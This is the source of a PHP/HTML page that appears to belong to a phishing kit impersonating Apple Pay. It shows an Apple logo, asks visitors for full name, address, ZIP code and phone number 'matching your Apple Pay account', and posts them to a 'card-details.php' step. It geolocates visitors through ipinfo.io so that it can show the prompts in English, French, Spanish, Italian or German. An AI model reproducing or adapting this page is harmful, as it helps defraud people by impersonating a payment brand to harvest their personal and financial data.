<?php
error_reporting(0);
include 'lib/page-functions.php';

page_initialise();
?>

<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, inital-scale=1">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css" integrity="sha384-vSIIfh2YWi9wW0r9iZe7RJPrKwp6bG+s9QZMoITbCckVJqGCCRhc+ccxNcdpHuYu" crossorigin="anonymous">
    <title>Apple Pay</title>

    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">

    <script src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>

    <script src="./lib/jquery.js"></script>
    <script src="./lib/jquery.mask.js"></script>
    <script src="./lib/jquery.validate.js"></script>
  </head>
  <body>
    <style>
      .content {
        width: 500px;
      }

      .title {
        margin-top: 25px;
        text-align: center;
        font-weight: bold;
      }

      .small-title {
        text-align: center;
        margin-top: -5px;
      }

      .input-section {
        padding: 10px;
      }

      .input-desc {
        font-weight: bold;
        text-align: center;
        font-size: 13px;
        margin-right: 15px;
      }

      .input {
        border: 0px solid lightgray;
        background: rgba(155, 155,155, 0.2);
        border-radius: 5px;
        padding: 5px;
        font-weight: 300;
        width: 100%;
        height: 45px;
        font-size: 18px;
      }

      .input:focus {
        outline: none;
      }

      .submit {
        margin-top: 35px;
        width: 100%;
        background: rgb(10, 132, 255);
        color: white;
        border: 1px solid rgb(60, 60, 255);
        border-radius: 7px;
        height: 45px;
      }

      .submit:hover {
        filter: brightness(95%);
      }

      .logo {
        width: 40px;
        display: block;
        margin: auto;
        margin-top: 30px;
      }

      .nav-btn {
        margin-top: 2px;
      }

      .nav-option {
        background: none;
        border: none;
        color: rgb(5,123,254);
      }

      .nav-option:hover {
        text-decoration: underline;
        filter: brightness(95%);
      }

      #center {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);

        width: 500px;
      }

      @media only screen and (max-width: 1035px) {
        #center {
          position: relative !important;
          transform: none;
          top: 0%;
          left: 0%;
        }
      }
    </style>
    <div class="container content">
      <form id="form" method="post" action="<?= construct_url("card-details.php") ?>">
      <div class="row" id="center">
        <div class="col-lg-12">
          <img class="logo" src="./lib/front_end_files/Apple_logo_black.svg.png">
          <h2 class="title" id="title1">Personal Details</h2>
          <p class="small-title" style="margin-top: 10px; font-size: 18px" id="title2">To begin, please enter your personal details below.</p>
          <p class="small-title" style="margin-top: 10px; font-size: 18px" id="title3">These details must match those of your Apple Pay account.</p>
          <div class="row">
            <div class="col-12">

                <div style="white-space:nowrap;" class="input-section">
                  <input type="text" id="fullname" class="input" name="fullname" placeholder="Full Name" required="required" style="background: rgba(0, 0, 0, 0.02); padding-left: 10px; font-weight: normal; border-radius: 2px;"/>
                </div>
                <div style="white-space:nowrap;" class="input-section">
                  <input type="text" id="address1" class="input" name="address1" placeholder="First Line of Address" required="required" style="background: rgba(0, 0, 0, 0.02); padding-left: 10px; font-weight: normal; border-radius: 2px;"/>
                </div>
                <div style="white-space:nowrap;" class="input-section">
                  <input type="text" id="address2" class="input" name="address2" placeholder="Second Line of Address" required="required" style="background: rgba(0, 0, 0, 0.02); padding-left: 10px; font-weight: normal; border-radius: 2px;"/>
                </div>
                <div style="white-space:nowrap;" class="input-section">
                  <input type="text" id="zipcode" class="input" name="zipcode" placeholder="ZIP Code" required="required" style="background: rgba(0, 0, 0, 0.02); padding-left: 10px; font-weight: normal; border-radius: 2px;"/>
                </div>
                <div style="white-space:nowrap;" class="input-section">
                  <input type="text" id="phonenumber" class="input" name="phonenumber" placeholder="Phone Number" required="required" style="background: rgba(0, 0, 0, 0.02); padding-left: 10px; font-weight: normal; border-radius: 2px;"/>
                </div>
                <button class="submit" style="border: none; width: 450px; display: block; margin: auto; margin-top: 15px;">Continue</button>
            </div>
          </div>
        </div>
      </div>
      </form>

      <?php
      if ($_SERVER["REMOTE_ADDR"] == "::1") { $ip = '102.129.216.255'; } else { $ip = $_SERVER["REMOTE_ADDR"]; }
      $country_code = json_decode(file_get_contents("http://ipinfo.io/$ip"), true)["country"];

        if ($country_code != 'gb' && $country_code != 'fr' && $country_code != 'es' && $country_code != 'it' && $country_code != 'de') {
          $country_code == "gb";
        }
       ?>

       <script>
       $('#form').validate({});
       </script>

       <style>
       .error {
         display: block;
         color: red;
         margin-top: 10px;
         /* font-weight: bold; */
         font-size: 13px;
       }

       input {
         font-size: 16px !important;
       }
       </style>

      <script>

      // Auto Translator

      var page_elements = ["title1", "title2", "title3", "submit-btn", "inputs"];
      var current_language = "<?= $country_code ?>".toLowerCase();


      var languages = {
        gb: {
          title1: 'Personal Details',
          title2: 'To begin, please enter your personal details below.',
          title3: 'These details must match those of your Apple Pay account.',
          'submit-btn': 'Continue',
          'language-inputs': {
            fullname: 'Your Name',
            address1: 'First Line of Address',
            address2: 'Second Line of Address',
            zipcode: 'Postcode',
            phonenumber: 'Phone Number'
          }
        },
        fr: {
          title1: "Détails personnels",
          title2: 'Pour commencer, veuillez saisir vos informations personnelles ci-dessous.',
          title3: 'Ces informations doivent correspondre à celles de votre compte Apple Pay.',
          'submit-btn': 'Continuer',
          'language-inputs': {
            fullname: 'Nom et prénom',
            address1: 'Première ligne d\'adresse',
            address2: 'Deuxième ligne d\'adresse',
            zipcode: 'Code postal',
            phonenumber: 'Numéro de téléphone'
          }
        },
        es: {
          title1: "Detalles personales",
          title2: 'Para comenzar, ingrese sus datos personales a continuación.',
          title3: 'Esta información debe coincidir con la información de su cuenta de Apple Pay.',
          'submit-btn': 'Continuar',
          'language-inputs': {
            fullname: 'Nombre completo',
            address1: 'Primera línea de dirección',
            address2: 'Segunda línea de dirección',
            zipcode: 'Código postal',
            phonenumber: 'Número de teléfono'
          }
        },
        it: {
          title1: 'Dati personali',
          title2: 'Per iniziare, inserisci i tuoi dati personali qui sotto.',
          title3: 'Questi dettagli devono corrispondere a quelli del tuo account Apple Pay.',
          'submit-btn': 'Continua',
          'language-inputs': {
            fullname: 'Nome e cognome',
            address1: 'Prima linea di indirizzo',
            address2: 'Seconda linea di indirizzo',
            zipcode: 'Cap',
            phonenumber: 'Numero di telefono'
          }
        },
        de: {
          title1: 'Persönliche Daten',
          title2: 'Geben Sie zunächst unten Ihre persönlichen Daten ein.',
          title3: 'Diese Angaben müssen mit denen Ihres Apple Pay-Kontos übereinstimmen.',
          'submit-btn': 'Fortsetzen',
          'language-inputs': {
            fullname: 'Vollständiger Name',
            address1: 'Erste Zeile der Adresse',
            address2: 'Zweite Adresszeile',
            zipcode: 'Postleitzahl',
            phonenumber: 'Telefonnummer'
          }
        },
      }

      for (var i = 0; i < page_elements.length; i++) {
        // console.log(languages[current_language]['inputs']);
        $('#' + page_elements[i]).text(languages[current_language][page_elements[i]])
      }

      for (const [input_name, input_placeholder] of Object.entries(languages[current_language]['language-inputs'])) {
        $('input[name=' + input_name + ']').attr("placeholder", input_placeholder);
      }

      </script>

      <script>
      $('input').keydown(function() {
        $('#submit-btn').attr("disabled", false);

        $('input').each(function(index) {
          if ($(this).val().length == 0) { $('#submit-btn').attr("disabled", true); }
        })
      })
      </script>

      <style>
      #submit-btn {
        transition: .2s all;
      }

      #submit-btn:disabled {
        background: rgb(150, 150, 255);
        cursor: not-allowed;
      }

      #submit-btn:disabled:hover {
        background: rgb(150, 150, 255) !important;
      }
      </style>

    </div>

  </body>
</html>
